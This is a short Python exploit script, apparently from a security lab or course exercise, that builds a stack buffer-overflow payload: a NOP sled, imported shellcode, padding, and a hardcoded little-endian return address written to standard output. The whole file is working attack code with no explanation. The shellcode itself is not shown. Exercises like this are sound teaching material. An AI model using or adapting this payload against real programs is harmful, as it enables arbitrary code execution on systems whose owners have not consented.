#!/usr/bin/env python3

import sys

from shellcode import shellcode


payload = b'\x90' * 512
payload += shellcode
payload += b'A' * 466
#7FFFFFF69A00
payload += (140737487739392).to_bytes(8, 'little')
sys.stdout.buffer.write(payload)